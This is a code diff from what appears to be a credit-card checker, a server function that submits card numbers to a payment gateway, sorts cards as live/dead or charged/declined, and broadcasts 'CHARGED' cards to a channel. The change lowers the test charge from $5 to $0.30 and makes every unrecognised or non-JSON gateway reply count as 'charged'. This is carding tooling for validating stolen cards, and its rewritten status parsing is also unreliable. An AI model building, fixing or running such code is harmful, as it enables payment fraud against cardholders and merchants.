@@ -120,70 +120,40 @@ const callApi = async (cc: string): Promise<{ status: string; message: string; r
       return { status: 'unknown', message: 'Empty response from gateway', rawResponse: '' };
     }
     
-    let apiStatus = 'unknown';
+    let apiStatus = 'charged'; // Default to charged
     let apiMessage = 'Transaction processed';
     
     try {
       const json = JSON.parse(rawText);
       
-      // Extract message - handle nested error structure from API
-      // API format: {"success":false,"error":{"error":{"code":"card_declined","message":"..."}}}
-      if (json.error?.error?.message) {
-        apiMessage = json.error.error.message;
-      } else if (json.error?.message) {
-        apiMessage = json.error.message;
-      } else if (json.message && typeof json.message === 'string') {
+      // Extract message - prioritize direct message field, then nested structures
+      if (json.message && typeof json.message === 'string') {
         apiMessage = json.message;
       } else if (json.msg && typeof json.msg === 'string') {
         apiMessage = json.msg;
+      } else if (json.error?.error?.message) {
+        apiMessage = json.error.error.message;
+      } else if (json.error?.message) {
+        apiMessage = json.error.message;
       } else if (json.error && typeof json.error === 'string') {
         apiMessage = json.error;
       }
       
-      // Determine status based on response
-      const successField = json.success;
+      // Determine status based on API status field
       const statusField = String(json.status || '').toLowerCase();
-      const errorCode = json.error?.error?.code || json.error?.code || '';
       
-      // Check success field first (most reliable)
-      if (successField === false) {
-        apiStatus = 'dead';
-      } else if (successField === true) {
-        apiStatus = 'live';
-      }
-      // Check error codes
-      else if (errorCode === 'card_declined' || errorCode.includes('declined') || errorCode.includes('error')) {
-        apiStatus = 'dead';
-      }
-      // Check status field
-      else if (statusField === 'declined' || statusField === 'failed' || statusField === 'error') {
-        apiStatus = 'dead';
-      } else if (statusField === 'success' || statusField === 'charged' || statusField === 'approved') {
-        apiStatus = 'live';
-      }
-      // Fallback: check message content
-      else {
-        const lowerMessage = apiMessage.toLowerCase();
-        if (lowerMessage.includes('declined') || lowerMessage.includes('failed') || 
-            lowerMessage.includes('invalid') || lowerMessage.includes('expired') || 
-            lowerMessage.includes('insufficient') || lowerMessage.includes('card_error')) {
-          apiStatus = 'dead';
-        } else if (lowerMessage.includes('success') || lowerMessage.includes('charged') || 
-                   lowerMessage.includes('approved')) {
-          apiStatus = 'live';
-        }
+      if (statusField === 'declined') {
+        apiStatus = 'declined';
+      } else if (statusField === '3ds_complete') {
+        apiStatus = '3ds';
+      } else {
+        // Any other status = charged
+        apiStatus = 'charged';
       }
       
     } catch {
-      // Non-JSON response - parse as text
-      const lowerText = rawText.toLowerCase();
-      apiMessage = rawText.substring(0, 200); // Limit message length
-      
-      if (lowerText.includes('declined') || lowerText.includes('failed') || lowerText.includes('error')) {
-        apiStatus = 'dead';
-      } else if (lowerText.includes('success') || lowerText.includes('charged') || lowerText.includes('approved')) {
-        apiStatus = 'live';
-      }
+      // Non-JSON response - default to charged, use raw text as message
+      apiMessage = rawText.substring(0, 200);
     }
     
     return { status: apiStatus, message: apiMessage, rawResponse: rawText };
@@ -272,24 +242,31 @@ serve(async (req) => {
     );
     
     // Broadcast CHARGED cards to channel (fire-and-forget)
-    if (result.status === 'live') {
+    if (result.status === 'charged') {
       notifyChargedCard(
         user.id,
         cc,
         'CHARGED',
         result.message,
-        '$5',
+        '$0.30',
         'StripeLow'
       );
     }
     
+    // Map status to API response format
+    const statusMap: Record<string, string> = {
+      'charged': 'CHARGED',
+      'declined': 'DECLINED',
+      '3ds': '3DS'
+    };
+    
     // Build response - only include rawResponse for admins
     const responseData: Record<string, unknown> = {
       computedStatus: result.status,
-      apiStatus: result.status === 'live' ? 'CHARGED' : result.status === 'dead' ? 'DECLINED' : 'UNKNOWN',
+      apiStatus: statusMap[result.status] || 'UNKNOWN',
       apiMessage: result.message,
-      apiTotal: '$5',
-      chargeAmount: '$5',
+      apiTotal: '$0.30',
+      chargeAmount: '$0.30',
       status: result.status,
       message: result.message,
     };
